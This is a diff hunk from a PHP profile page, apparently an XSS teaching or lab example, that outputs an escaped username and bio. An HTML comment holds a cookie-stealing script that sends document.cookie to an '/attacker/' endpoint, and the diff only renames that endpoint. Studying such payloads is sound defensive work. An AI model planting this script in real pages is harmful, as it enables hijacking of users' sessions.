@@ -32,7 +32,7 @@ $user = $user->fetchObject();
 </head>
 <body>
     <h2><?= escape($user->username); ?></h2>
-    <!--  <script>document.location = "/attacker/cookie.php?cookie=" + document.cookie</script>  -->
+    <!--  <script>document.location = "/attacker/xss.php?cookie=" + document.cookie</script>  -->
     <p><?= escape($user->bio); ?></p>
 </body>
 </html>
